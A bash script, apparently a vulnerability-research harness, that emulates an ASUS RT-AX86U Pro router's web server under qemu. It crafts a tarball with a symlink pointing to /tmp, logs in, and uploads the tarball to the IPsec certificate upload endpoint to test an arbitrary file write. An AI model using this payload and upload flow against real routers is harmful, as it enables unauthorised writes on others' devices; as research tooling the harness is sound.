#!/usr/bin/env bash
set -euo pipefail

SRC=${SRC:-/root/inout/firmware/unpacked/asus/RT-AX86U_PRO_300610237436/_RT-AX86U_PRO_3.0.0.6_102_37436-g5a1fb9f_476-gaed2e_nand_squashfs.pkgtb.extracted/squashfs-root}
BASE=${BASE:-/root/inout/work/deepdive/asus_rt_ax86u_pro_300610237436_initial_2026_06_09/ipsec_upload_symlink_write}
ROOT="$BASE/rootfs"

case "$BASE" in
  /root/inout/work/deepdive/asus_rt_ax86u_pro_300610237436_initial_2026_06_09/*) ;;
  *) echo "Refusing unexpected BASE=$BASE" >&2; exit 2 ;;
esac

rm -rf "$BASE"
mkdir -p "$ROOT"
tar -C "$SRC" \
  --exclude='*.id0' --exclude='*.id1' --exclude='*.id2' --exclude='*.nam' --exclude='*.til' --exclude='*.i64' \
  -cf - . | tar -C "$ROOT" -xf -

mkdir -p "$ROOT/tmp" "$ROOT/proc" "$ROOT/dev" "$ROOT/var/run" "$ROOT/var/log" "$ROOT/var/tmp" "$ROOT/usr/bin" "$ROOT/jffs/usericon" "$ROOT/jffs/ca_files" "$ROOT/data"
cp /usr/bin/qemu-arm-static "$ROOT/usr/bin/qemu-arm-static"
touch "$ROOT/dev/urandom"
printf '{}\n' > "$ROOT/jffs/usericon/usericon_md5.json"

for rel in sbin/rc sbin/notify_rc sbin/service-event usr/sbin/nvram bin/nvram; do
  f="$ROOT/$rel"
  mkdir -p "$(dirname "$f")"
  if [ -e "$f" ] && [ ! -e "$f.real" ]; then mv "$f" "$f.real"; fi
  cat > "$f" <<SH
#!/bin/sh
echo "$rel \$*" >> /tmp/asus_cmd_hits.log
exit 0
SH
  chmod +x "$f"
done
touch "$ROOT/tmp/asus_cmd_hits.log"

python3 - "$BASE" <<'PY'
import io
import os
import tarfile
import time

base = os.sys.argv[1]
payload_path = os.path.join(base, "server_ipsec_symlink_upload.tgz")
with tarfile.open(payload_path, "w:gz") as tf:
    link = tarfile.TarInfo("linkout")
    link.type = tarfile.SYMTYPE
    link.linkname = "/tmp"
    link.mtime = int(time.time())
    tf.addfile(link)
    data = b"HTTP_SYMLINK_WRITE\n"
    ti = tarfile.TarInfo("linkout/asus_http_upload_symlink_write")
    ti.size = len(data)
    ti.mtime = int(time.time())
    ti.mode = 0o644
    tf.addfile(ti, io.BytesIO(data))
print(payload_path)
PY

env -i PATH="/bin:/sbin:/usr/bin:/usr/sbin" HOME="/" LD_LIBRARY_PATH="/lib:/usr/lib" \
  chroot "$ROOT" /usr/bin/qemu-arm-static -L / /usr/sbin/httpd \
  > "$BASE/httpd.stdout.log" 2> "$BASE/httpd.stderr.log" &
pid=$!
trap 'kill "$pid" 2>/dev/null || true' EXIT
echo "$pid" > "$BASE/httpd.pid"

for _ in $(seq 1 40); do
  python3 - <<'PY' && break
import socket
s=socket.socket(); s.settimeout(.25)
raise SystemExit(0 if s.connect_ex(("127.0.0.1",80)) == 0 else 1)
PY
  sleep .5
done

set +e
timeout 20 python3 -u - "$BASE" <<'PY' > "$BASE/probe.log" 2>&1
import base64
import hashlib
import http.client
import json
import os
import random
import string
import time
from urllib.parse import urlencode

base = os.sys.argv[1]
payload = open(os.path.join(base, "server_ipsec_symlink_upload.tgz"), "rb").read()

def req(method, path, body=None, headers=None):
    c = http.client.HTTPConnection("127.0.0.1", 80, timeout=8)
    h = {"Host": "127.0.0.1"}
    if headers:
        h.update(headers)
    c.request(method, path, body=body, headers=h)
    r = c.getresponse()
    data = r.read(4096)
    hdrs = {k.lower(): v for k, v in r.getheaders()}
    c.close()
    print(method, path, r.status, hdrs, data[:200], flush=True)
    return r.status, hdrs, data

def rand(n):
    return "".join(random.choice(string.ascii_letters + string.digits) for _ in range(n))

login_id = rand(10)
_, _, body = req("POST", "/get_Nonce.cgi", json.dumps({"id": login_id}).encode(), {"Content-Type": "application/json"})
nonce = json.loads(body.decode())["nonce"]
cnonce = rand(32)
digest = hashlib.sha256(f":{nonce}::{cnonce}".encode()).hexdigest()
params = {
    "group_id": "",
    "action_mode": "",
    "action_script": "",
    "action_wait": "5",
    "current_page": "Main_Login.asp",
    "next_page": "index.asp",
    "login_authorization": digest,
    "id": login_id,
    "cnonce": cnonce,
    "login_captcha": base64.b64encode(b"").decode(),
}
_, hdrs, _ = req("POST", "/login_v2.cgi", urlencode(params).encode(), {"Content-Type": "application/x-www-form-urlencoded"})
cookie = hdrs.get("set-cookie", "").split(";", 1)[0]
print("COOKIE", cookie, flush=True)
open(os.path.join(base, "cookie.txt"), "w").write(cookie + "\n")

boundary = "----firmrecasusipsec"
body = (
    f"--{boundary}\r\n"
    'Content-Disposition: form-data; name="import_cert_file"; filename="server_ipsec.tgz"\r\n'
    "Content-Type: application/octet-stream\r\n\r\n"
).encode() + payload + f"\r\n--{boundary}--\r\n".encode()
open(os.path.join(base, "upload_body.bin"), "wb").write(body)
open(os.path.join(base, "upload_meta.env"), "w").write(f"BOUNDARY={boundary}\nCONTENT_LENGTH={len(body)}\n")
print("UPLOAD_BODY_READY", len(body), flush=True)
PY
login_rc=$?

if [ ! -s "$BASE/cookie.txt" ] || [ ! -s "$BASE/upload_body.bin" ]; then
  echo "Login or upload body preparation failed; continuing to evidence collection" >> "$BASE/probe.log"
else
  cookie="$(cat "$BASE/cookie.txt")"
  boundary="$(sed -n 's/^BOUNDARY=//p' "$BASE/upload_meta.env")"
  content_length="$(sed -n 's/^CONTENT_LENGTH=//p' "$BASE/upload_meta.env")"
  set +e
  python3 -u - "$BASE" "$cookie" "$boundary" "$content_length" <<'PY' >> "$BASE/probe.log" 2>&1
import os
import socket
import sys
import time

base, cookie, boundary, content_length = sys.argv[1:5]
body = open(os.path.join(base, "upload_body.bin"), "rb").read()
request = (
    "POST /upload_server_ipsec_cert.cgi HTTP/1.1\r\n"
    "Host: 127.0.0.1\r\n"
    f"Cookie: {cookie}\r\n"
    f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
    f"Content-Length: {content_length}\r\n"
    "Connection: close\r\n\r\n"
).encode() + body

print("RAW_UPLOAD_BEGIN", len(request), flush=True)
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.settimeout(2)
sock.connect(("127.0.0.1", 80))
sock.sendall(request)
print("RAW_UPLOAD_SENT", flush=True)
time.sleep(2)
try:
    print("RAW_UPLOAD_RECV", sock.recv(4096)[:200], flush=True)
except Exception as exc:
    print("RAW_UPLOAD_RECV_EXC", type(exc).__name__, str(exc), flush=True)
sock.close()
PY
  upload_rc=$?
  echo "RAW_UPLOAD_RC $upload_rc" >> "$BASE/probe.log"
fi
set -e

sleep 2

{
  set +e
  echo "### login rc"
  echo "$login_rc"
  echo
  echo "### probe rc"
  echo "${upload_rc:-not_run}"
  echo
  echo "### httpd status"
  if kill -0 "$pid" 2>/dev/null; then echo "alive"; else echo "dead"; fi
  echo
  echo "### probe log"
  cat "$BASE/probe.log" || true
  echo
  echo "### files"
  for p in \
    "$ROOT/tmp/server_ipsec_file/server_ipsec.tgz" \
    "$ROOT/tmp/server_ipsec_file/linkout" \
    "$ROOT/tmp/asus_http_upload_symlink_write" \
    "$ROOT/tmp/asus_tar_symlink_write" \
    "$ROOT/jffs/ca_files/asusCert.der"; do
    if [ -e "$p" ] || [ -L "$p" ]; then
      printf 'EXISTS %s: ' "${p#$ROOT}"
      ls -ld "$p" || true
      printf 'CONTENT %s: ' "${p#$ROOT}"
      head -c 120 "$p" 2>/dev/null || true
      echo
    else
      echo "MISSING ${p#$ROOT}"
    fi
  done
  echo
  echo "### command hits"
  cat "$ROOT/tmp/asus_cmd_hits.log" 2>/dev/null || true
  echo
  echo "### stderr tail"
  tail -n 120 "$BASE/httpd.stderr.log" || true
} | tee "$BASE/evidence.txt"

echo "$BASE/evidence.txt"
